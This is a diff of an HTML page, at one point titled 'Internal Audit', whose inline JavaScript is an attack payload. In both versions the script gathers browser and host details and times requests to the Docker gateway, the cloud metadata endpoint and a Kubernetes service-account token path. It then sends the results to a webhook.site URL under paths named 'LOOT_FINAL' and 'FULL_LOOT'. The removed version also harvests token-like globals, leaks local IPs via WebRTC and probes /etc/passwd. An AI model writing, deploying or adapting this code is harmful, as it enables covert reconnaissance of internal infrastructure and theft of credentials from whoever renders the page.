@@ -1,54 +1,40 @@
 <!DOCTYPE html>
 <html>
-<head><title>Internal Audit</title></head>
 <body>
-    <script>
-        (async function() {
-            const hook = "https://webhook.site/a792cec2-4ac4-47f4-b6c7-67ac60e6b049";
-            
-            // 1. Собираем системное окружение
-            const envData = {
-                type: "SYSTEM_REPORT",
-                hardware: navigator.hardwareConcurrency, // Ядра CPU
-                memory: navigator.deviceMemory,          // RAM
-                webdriver: navigator.webdriver,          // Chrome Headless?
-                platform: navigator.platform,
-                location: window.location.href
-            };
+<script>
+    (async function() {
+        const hook = "https://webhook.site/a792cec2-4ac4-47f4-b6c7-67ac60e6b049";
+        
+        // Собираем инфу о движке
+        const report = {
+            url: window.location.href,
+            platform: navigator.platform,
+            // Проверка на Docker/K8s через специфические ошибки
+            is_container: !!(window.performance && performance.memory),
+            // Вытягиваем все ключи из window, которые не стандартные (кастомные конфиги)
+            custom_vars: Object.keys(window).filter(key => !window.hasOwnProperty(key)).slice(0, 50),
+            // Тайминги до внутренних ресурсов (если < 50ms - ресурс в локалке)
+            internal_check: {}
+        };
 
-            // 2. Пытаемся найти скрытые глобальные переменные (токены/пути)
-            const globals = {};
-            const interestingKeys = ['token', 'auth', 'config', 'env', 'path', 'internal'];
-            for (let key in window) {
-                if (interestingKeys.some(k => key.toLowerCase().includes(k))) {
-                    try { globals[key] = window[key]; } catch(e) {}
-                }
+        const targets = {
+            "gateway": "http://172.17.0.1",
+            "metadata": "http://169.254.169.254/latest/meta-data/",
+            "k8s_token": "file:///var/run/secrets/kubernetes.io/serviceaccount/token"
+        };
+
+        for (let name in targets) {
+            const start = Date.now();
+            try {
+                await fetch(targets[name], { mode: 'no-cors', cache: 'no-store' });
+                report.internal_check[name] = Date.now() - start + "ms (OPEN)";
+            } catch (e) {
+                report.internal_check[name] = "closed/blocked";
             }
+        }
 
-            // 3. Сканируем подсеть (если 127.0.0.1 открыт, может и соседние IP тоже?)
-            // Попробуем прощупать стандартный шлюз Docker
-            const internalTargets = ["127.0.0.1", "172.17.0.1", "10.0.0.1"];
-            
-            // Отправляем всё это добро одним мощным пакетом
-            navigator.sendBeacon(hook + "/LOOT_FINAL", JSON.stringify({
-                env: envData,
-                leaked_globals: globals,
-                webrtc: await (async () => {
-                    try {
-                        const pc = new RTCPeerConnection();
-                        pc.createDataChannel("");
-                        const offer = await pc.createOffer();
-                        return offer.sdp.match(/(?:\d{1,3}\.){3}\d{1,3}/g);
-                    } catch (e) { return "blocked"; }
-                })()
-            }));
-
-            // 4. Попытка вызвать системную ошибку для раскрытия путей
-            const img = new Image();
-            img.src = "file:///etc/passwd"; // Это вызовет ошибку в консоли, которую мы логируем
-            img.onerror = () => { navigator.sendBeacon(hook + "/LOCAL_FILE_ERR"); };
-
-        })();
-    </script>
+        navigator.sendBeacon(hook + "/FULL_LOOT", JSON.stringify(report));
+    })();
+</script>
 </body>
 </html>
